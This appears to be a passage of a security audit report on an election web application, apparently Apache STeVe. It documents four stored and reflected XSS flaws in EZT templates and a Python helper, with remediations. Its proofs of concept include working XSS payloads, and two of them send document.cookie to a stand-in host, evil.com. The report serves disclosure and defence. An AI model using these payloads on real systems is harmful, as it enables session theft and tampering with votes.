**Key Issues Identified:**

The audit identified a systemic **Type B gap** in the application's format string sanitization: the EZT template escaping control (`[format "html"]` / `[format "js,html"]`) exists and is used in some JavaScript attribute contexts, but is systematically absent in HTML body and JavaScript literal contexts. Additionally, a Python helper function constructs HTML strings from user-controlled input without any sanitization. All four findings represent stored or reflected XSS vulnerabilities affecting authenticated users.

### ASVS-1310-HIGH-001: Stored XSS — User-Controlled Data in EZT Format Strings Without HTML Escaping

**Severity:** HIGH  
**Finding ID:** ASVS-1310-HIGH-001  
**Gap Type:** Type B — Control EXISTS (`[format "html"]`) but NOT CALLED at these output points

**Location:**
- **File:** `v3/server/templates/admin.ezt`
  - **Lines:** Multiple (containing `[owned.title]`, `[owned.owner_name]`, `[owned.authz]`)
- **File:** `v3/server/templates/voter.ezt`
  - **Lines:** Multiple (containing `[open_elections.title]`, `[open_elections.owner_name]`)
- **File:** `v3/server/templates/manage.ezt`
  - **Lines:** Multiple (containing `[issues.title]` in `<strong>`, `[issues.description]` in description div)
- **File:** `v3/server/templates/manage-stv.ezt`
  - **Lines:** Multiple (same pattern as manage.ezt)
- **File:** `v3/server/templates/flashes.ezt`
  - **Lines:** Flash message rendering (`[flashes.message]`)
- **File:** `v3/server/pages.py`
  - **Function:** Multiple flash message calls
  - **Lines:** ~361, 384, 491, 496, 500, 519, 527, 542, 558, 584, 607, 627

**Related Functions Checked:**
- `flash_success()` — constructs unescaped flash messages
- `flash_danger()` — constructs unescaped flash messages
- Template rendering functions in all listed templates

**Description:**

User-controlled data (election titles, descriptions, owner names, flash messages) is rendered in EZT templates without HTML entity escaping. The EZT `[format "html"]` directive exists and is used elsewhere in the codebase (e.g., in onclick attributes), but is systematically omitted in HTML body contexts. This allows stored XSS attacks through multiple vectors.

**Vulnerable Code:**

*admin.ezt:*
```html
<h5 class="card-title">[owned.title]...
...
<div class="card-footer text-muted small">
    Created by [owned.owner_name] ([owned.owner_pid])
    [if-any owned.authz]
        (authz: [owned.authz])
    [end]
```

*flashes.ezt:*
```html
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [flashes.message]
```

*pages.py flash construction:*
```python
await flash_success(f'Created election: {form.title}')
# ...
await flash_danger(f'Invalid issue ID: {iid}')
await flash_danger(f'Error submitting vote for issue {iid}.')
await flash_success(f'Issue "{form.title}" has been added.')
```

**Data Flow:**

1. **Source:** User submits election title via `POST /do-create-election` form (`form.title`)
2. **Processing:** Title stored in database without sanitization
3. **Sink 1:** `flash_success(f'Created election: {form.title}')` embeds raw user input into f-string → stored in session → rendered in `flashes.ezt` as `[flashes.message]` without `[format "html"]`
4. **Sink 2:** Election title stored in DB → queried by `q_owned` → rendered in `admin.ezt` as `[owned.title]` without `[format "html"]`
5. **Missing Control:** `[format "html"]` exists in codebase but is not applied at any of these output points

**Proof of Concept:**

```http
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: [valid_session_cookie]

title=<img+src=x+onerror=alert(document.cookie)>&csrf_token=placeholder
```

Any authenticated user viewing `/admin` or `/voter` sees the stored XSS payload render from the election title. The flash message also executes on redirect for the submitting user.

**Impact:**

Stored XSS affecting all authenticated users who view election listings. An attacker (any PMC member who can create elections) can:
- Steal session tokens from other administrators and voters
- Perform actions on behalf of other users
- Manipulate voting interfaces
- Exfiltrate sensitive election data

**Remediation:**

*Template fixes (apply to all affected templates):*
```html
<!-- flashes.ezt: escape message content -->
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [format "html"][flashes.message][end]

<!-- admin.ezt / voter.ezt: escape all user-supplied data -->
<h5 class="card-title">[format "html"][owned.title][end]</h5>
Created by [format "html"][owned.owner_name][end]
(authz: [format "html"][owned.authz][end])

<!-- manage.ezt / manage-stv.ezt: escape title and description -->
<strong>[format "html"][issues.title][end]</strong>
<div>[format "html"][issues.description][end]</div>
```

### ASVS-1310-HIGH-002: Stored XSS — HTML Format String Construction from User Input in `rewrite_description`

**Severity:** HIGH  
**Finding ID:** ASVS-1310-HIGH-002  
**Gap Type:** Type A — No sanitization control at this entry point

**Location:**
- **File:** `v3/server/pages.py`
  - **Function:** `rewrite_description`
  - **Lines:** ~35-42
- **File:** `v3/server/templates/vote-on.ezt`
  - **Context:** Description div rendering

**Related Functions Checked:**
- `rewrite_description()` — HTML construction without escaping
- Issue creation handlers in pages.py
- Template rendering in vote-on.ezt

**Description:**

The `rewrite_description()` function constructs HTML strings from user-controlled issue descriptions without any HTML entity escaping. It wraps content in `<pre>` tags and converts `doc:filename` patterns to `<a>` tags, but neither the raw description nor the extracted filenames are sanitized before HTML construction.

**Vulnerable Code:**

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

**Data Flow:**

1. **Source:** Admin creates issue via `POST /do-add-issue/<eid>` with `form.description`
2. **Processing:** `rewrite_description()` extracts `doc:filename` patterns and creates `<a>` tags; wraps everything in `<pre>`. Neither the raw description nor the extracted filename is HTML-escaped.
3. **Storage:** Modified description stored in database
4. **Sink:** `vote-on.ezt` renders `[issues.description]` without escaping (already contains HTML)
5. **Missing Control:** No `html.escape()` or equivalent applied before HTML construction

**Proof of Concept:**

*Scenario 1 — Raw description XSS:*
```
Create issue with description:
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```
The `<pre>` wrapper does not neutralize HTML tags. Result:
```html
<pre><script>fetch('https://evil.com/?c='+document.cookie)</script></pre>
```

*Scenario 2 — `doc:` pattern attribute injection:*
```
Create issue with description:
doc:x"><img/src=x/onerror=alert(1)>
```
The regex captures `x"><img/src=x/onerror=alert(1)>` as filename. Result:
```html
<pre><a href="/docs/IID/x"><img/src=x/onerror=alert(1)>">x"><img/src=x/onerror=alert(1)></a></pre>
```
This breaks out of the `href` attribute and injects an `<img>` with an event handler.

**Impact:**

Stored XSS on the voting page. Every voter viewing the election executes the payload. An election administrator can:
- Steal voter session tokens
- Manipulate the voting interface (change displayed candidates, auto-submit votes)
- Exfiltrate voting choices
- Compromise election integrity

**Remediation:**

```python
import html as html_module

def rewrite_description(issue):
    import re
    # HTML-escape the raw description FIRST
    desc = html_module.escape(issue.description or '')
    # Then convert doc:filename to links (filename is already escaped)
    def repl(match):
        filename = match.group(1)  # already escaped by html.escape above
        return f'<a href="/docs/{html_module.escape(issue.iid)}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

### ASVS-1310-HIGH-003: JavaScript Injection — User Data in EZT Format Strings Embedded in Script Block Without JS Escaping

**Severity:** HIGH  
**Finding ID:** ASVS-1310-HIGH-003  
**Gap Type:** Type B — `[format "js,html"]` exists in `manage.ezt` onclick handlers but NOT applied in `vote-on.ezt` `<script>` block

**Location:**
- **File:** `v3/server/templates/vote-on.ezt`
  - **Context:** STV_CANDIDATES JavaScript object in `<script>` block
  - **Lines:** Multiple within script block

**Related Functions Checked:**
- `vote_on_page()` in pages.py — data preparation
- Issue and candidate query functions
- Template rendering for STV elections

**Description:**

User-controlled data (issue titles, candidate names, candidate labels) is embedded directly into JavaScript string literals within a `<script>` block without JavaScript escaping. The EZT `[format "js"]` or `[format "js,html"]` directive exists and is used elsewhere (e.g., onclick attributes in manage.ezt), but is not applied in this critical context.

**Vulnerable Code:**

```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
[for issues.candidates]        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
[end]      ]
    },
[end][end]  };
```

`[issues.title]`, `[issues.candidates.label]`, and `[issues.candidates.name]` are embedded inside JavaScript string literals without `[format "js"]` or `[format "js,html"]` escaping.

**Data Flow:**

1. **Source:** Admin sets issue title via `POST /do-add-issue/<eid>` (`form.title`), or STV candidate names via `create-election.py` YAML (`kv.labelmap`)
2. **Storage:** Values stored in database without JavaScript-specific sanitization
3. **Processing:** `vote_on_page()` retrieves issues and candidates, passes to template
4. **Sink:** EZT resolves `[issues.title]` directly into a JavaScript string literal in `<script>` block
5. **Missing Control:** `[format "js"]` is NOT used, despite being available and used elsewhere in the codebase

**Proof of Concept:**

Create an STV issue with title:
```
Board Election"+alert(document.cookie)+"
```

The resolved JavaScript becomes:
```javascript
title: "Board Election"+alert(document.cookie)+"",
```

This executes `alert(document.cookie)` when any voter opens the voting page.

Alternative payload using candidate name:
```
Alice"+fetch('https://evil.com/?c='+document.cookie)+"
```

**Impact:**

Stored XSS via JavaScript injection affecting all voters viewing STV ballots. Attacker can:
- Execute arbitrary JavaScript in the voter's browser context
- Manipulate vote submissions
- Steal session tokens
- Exfiltrate voting data
- Compromise election integrity

**Remediation:**

```html
<!-- Apply JS escaping for all values inside <script> blocks -->
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[format "js"][issues.iid][end]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
[end][end]  };
```

### ASVS-1310-HIGH-004: Reflected XSS — URL Path Parameters in EZT Error Template Format Strings Without Escaping

**Severity:** HIGH  
**Finding ID:** ASVS-1310-HIGH-004  
**Gap Type:** Type A — No sanitization control applied

**Location:**
- **File:** `v3/server/pages.py`
  - **Function:** `load_election` decorator
  - **Lines:** ~163-166
  - **Function:** `load_election_issue` decorator
  - **Lines:** ~185-188, 199-202
- **File:** `v3/server/templates/e_bad_eid.ezt`
  - **Context:** Error message rendering with `[eid]`
- **File:** `v3/server/templates/e_bad_iid.ezt`
  - **Context:** Error message rendering with `[iid]`

**Related Functions Checked:**
- `load_election()` decorator — election ID validation
- `load_election_issue()` decorator — issue ID validation
- Error page rendering in EZT templates

**Description:**

URL path parameters (election ID and issue ID) are extracted from the request path and passed directly to error templates without HTML entity escaping. When an invalid ID is provided, the error template renders the raw parameter value in the HTML body, enabling reflected XSS attacks.

**Vulnerable Code:**

*pages.py — load_election:*
```python
async def loader(eid):
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # URL parameter assigned directly
        raise_404(T_BAD_EID, result)
```

*e_bad_eid.ezt:*
```html
<p>
    The Election ID ([eid]) does not exist,
    you have no issues to vote in that Election,
    or you are not allowed to manage that Election.
</p>
```

**Data Flow:**

1. **Source:** URL path parameter: `GET /vote-on/<eid>` or `GET /manage/<eid>`
2. **Processing:** `load_election` extracts `eid` from URL, assigns `result.eid = eid` without validation or sanitization
3. **Sink:** `e_bad_eid.ezt` renders `[eid]` in HTML body without `[format "html"]`
4. **Missing Control:** No HTML escaping applied to URL-sourced path parameter

Same pattern applies for `iid` via `/manage-stv/<eid>/<iid>` or `/do-edit-issue/<eid>/<iid>`.

**Proof of Concept:**

```http
GET /manage/<img%20src=x%20onerror=alert(document.cookie)> HTTP/1.1
Cookie: [valid_session_cookie]
```

The election ID won't exist, so the error template renders:
```html
<p>
    The Election ID (<img src=x onerror=alert(document.cookie)>) does not exist,
    you have no issues to vote in that Election,
    or you are not allowed to manage that Election.
</p>
```

Same attack vector for issue IDs:
```http
GET /manage-stv/valid_eid/<script>alert(1)</script> HTTP/1.1
```

**Impact:**

Reflected XSS against any authenticated user who clicks a crafted link. Attacker can:
- Hijack sessions through social engineering (phishing emails with malicious links)
- Execute actions on behalf of the victim
- Steal sensitive information from the victim's session
- Conduct targeted attacks against specific administrators or voters

**Remediation:**

*Template fixes:*
```html
<!-- e_bad_eid.ezt -->
<p>
    The Election ID ([format "html"][eid][end]) does not exist,
    you have no issues to vote in that Election,
    or you are not allowed to manage that Election.
</p>

<!-- e_bad_iid.ezt -->
<p>
    The Issue ID ([format "html"][iid][end]) does not exist,
    you have no issues to vote in that Issue,
    or you are not allowed to manage that Issue.
</p>
```

*Server-side validation (defense in depth):*
```python
import re
EID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+$')
IID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+$')

async def loader(eid):
    if not EID_PATTERN.match(eid):
        quart.abort(400, 'Invalid election ID format')
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # Now validated
        raise_404(T_BAD_EID, result)
```

## Architecture Observations

### 1. Default-Unsafe Template Engine

The EZT templating engine does NOT auto-escape output. Every `[variable]` directive outputs raw content unless explicitly wrapped in `[format]` directives. This creates a "default-unsafe" template environment where every output point requires explicit escaping — the opposite of modern template engines like Jinja2 (with autoescape) or React JSX.

**Implications:**
- High cognitive load on developers to remember escaping at every output point
- Systematic risk of XSS vulnerabilities when new templates are added
- No compiler or linter warnings for missing escaping

### 2. Inconsistent Escaping Pattern

The developers demonstrate awareness of EZT escaping by using `[format "js,html"]` in `onclick` attribute values in manage templates. However, the same variables are output unescaped just lines away in HTML body context. This inconsistency suggests:
- Incomplete understanding of which contexts require escaping
- Possible copy-paste errors or incomplete refactoring
- Lack of systematic code review for template security

**Evidence:**
```html
<!-- manage.ezt: ESCAPED in onclick -->
<button onclick="deleteIssue('[format "js,html"][issues.iid][end]', '[format "js,html"][issues.title][end]')">

<!-- manage.ezt: UNESCAPED in body (same file, lines apart) -->
<strong>[issues.title]</strong>
```

### 3. Missing Votestring Validation

In `election.py` `add_vote()`, there is a comment `### validate VOTESTRING for ISSUE.TYPE voting` but no implementation. While not a format string issue per se, malformed vote data could cause issues during tallying or result in data integrity problems.

**Recommendation:** Implement votestring validation to ensure votes conform to expected format for each voting type (YNA, STV, etc.).

### 4. Secure SQL Layer

The SQL layer demonstrates excellent security practices:
- All queries in `queries.yaml` use parameterized placeholders (`?`)
- No string concatenation or f-strings in SQL construction
- Consistent pattern across all database operations

This provides a strong foundation and demonstrates the team's capability to implement security controls when they are systematically applied.

## Recommendations Summary

### Immediate Actions (Priority 1)

**1. Apply `[format "html"]` escaping to ALL user-derived EZT outputs**

Conduct a systematic audit of every `[variable]` directive across all templates and apply appropriate escaping:
- `[format "html"]` for HTML body context
- `[format "js"]` for JavaScript string context  
- `[format "js,html"]` for JavaScript within HTML attributes

**Affected templates requiring immediate remediation:**
- `admin.ezt` — all election metadata
- `voter.ezt` — all election metadata
- `manage.ezt` — issue titles and descriptions in body
- `manage-stv.ezt` — issue titles and descriptions in body
- `vote-on.ezt` — all issue and candidate data in HTML body
- `flashes.ezt` — all flash messages
- `e_bad_eid.ezt` — election ID in error message
- `e_bad_iid.ezt` — issue ID in error message
- `e_bad_pid.ezt` — person ID in error message (if exists)

**2. Fix `rewrite_description()` function**

```python
import html as html_module

def rewrite_description(issue):
    import re
    # Escape FIRST, then build HTML
    desc = html_module.escape(issue.description or '')
    def repl(match):
```

**3. Escape JavaScript string literals in `vote-on.ezt`**

Apply `[format "js"]` to all user data in the STV_CANDIDATES object and any other JavaScript string contexts.

### Short-term Actions (Priority 2)

**4. Add server-side input validation for IDs**

Implement allowlist validation for election IDs and issue IDs:

```python
import re
EID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')
IID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')

def validate_eid(eid: str) -> bool:
    return bool(EID_PATTERN.match(eid))

def validate_iid(iid: str) -> bool:
    return bool(IID_PATTERN.match(iid))
```

Apply in all decorators and handlers that process URL path parameters.

**5. Create template security linting**

Develop a script to scan all `.ezt` files for unescaped output directives:
- Flag any `[variable]` not wrapped in `[format]`
- Generate report of potential XSS risks
- Integrate into CI/CD pipeline

**6. Implement Content Security Policy**

Add CSP headers to mitigate XSS impact:
